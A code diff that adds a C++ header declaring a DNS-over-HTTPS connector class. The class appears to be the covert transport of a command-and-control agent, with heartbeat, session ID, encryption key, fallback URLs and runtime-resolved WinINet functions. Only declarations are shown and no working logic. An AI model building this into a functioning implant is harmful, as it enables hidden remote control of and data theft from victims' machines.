@@ -1,0 +1,88 @@
+#pragma once
+
+#include "AgentConfig.h"
+#include <windows.h>
+#include <wininet.h>
+
+#define DECL_API(x) decltype(x) * x
+
+struct DOH_HTTP_FUNC {
+    DECL_API(LocalAlloc);
+    DECL_API(LocalReAlloc);
+    DECL_API(LocalFree);
+    DECL_API(LoadLibraryA);
+    DECL_API(GetProcAddress);
+    DECL_API(GetLastError);
+
+    DECL_API(InternetOpenA);
+    DECL_API(InternetConnectA);
+    DECL_API(HttpOpenRequestA);
+    DECL_API(HttpSendRequestA);
+    DECL_API(InternetSetOptionA);
+    DECL_API(InternetQueryOptionA);
+    DECL_API(HttpQueryInfoA);
+    DECL_API(InternetQueryDataAvailable);
+    DECL_API(InternetCloseHandle);
+    DECL_API(InternetReadFile);
+};
+
+class ConnectorDoH
+{
+private:
+    ProfileDoH profile = { 0 };
+    DOH_HTTP_FUNC* functions = NULL;
+    HINTERNET hInternet = NULL;
+    HINTERNET hConnect  = NULL;
+
+    // cached session/transport parameters
+    CHAR  sid[17] = { 0 };       
+    BYTE  encryptKey[16] = { 0 };
+    ULONG pktSize = 0;
+    ULONG labelSize = 0;
+    CHAR  domain[256] = { 0 };
+    
+    // Multi-URL support
+    CHAR  rawUrls[2048] = { 0 }; // Storage for the full string
+    CHAR* urlList[16] = { 0 };   // Pointers to individual URLs in rawUrls
+    ULONG urlCount = 0;
+    ULONG currentUrlIndex = 0;
+
+    BOOL  initialized = FALSE;
+    BOOL  hiSent = FALSE;
+    BYTE* hiBeat = NULL;
+    ULONG hiBeatSize = 0;
+    ULONG hiRetries = 3;
+    ULONG seq = 0;
+    ULONG idx = 0;
+
+    BYTE* recvData = NULL;
+    int   recvSize = 0;
+
+    // downlink reassembly buffer
+    BYTE* downBuf    = NULL;
+    ULONG downTotal  = 0;
+    ULONG downFilled = 0;
+    ULONG lastDownTotal   = 0;
+    ULONG lastUpTotal     = 0;
+
+public:
+    ConnectorDoH();
+    ~ConnectorDoH(); // Add destructor to clean up
+
+    BOOL SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize);
+    void CloseConnector();
+
+    void  SendData(BYTE* data, ULONG data_size);
+    BYTE* RecvData();
+    int   RecvSize();
+    void  RecvClear();
+
+    ULONG GetLastUpTotal() const { return lastUpTotal; }
+    ULONG GetLastDownTotal() const { return lastDownTotal; }
+    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
+    BOOL  IsBusy() const { return (downBuf != NULL); }
+
+private:
+    BOOL  DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  PerformHttpRequest(const CHAR* requestUrl, BYTE** outData, ULONG* outLen);
+};
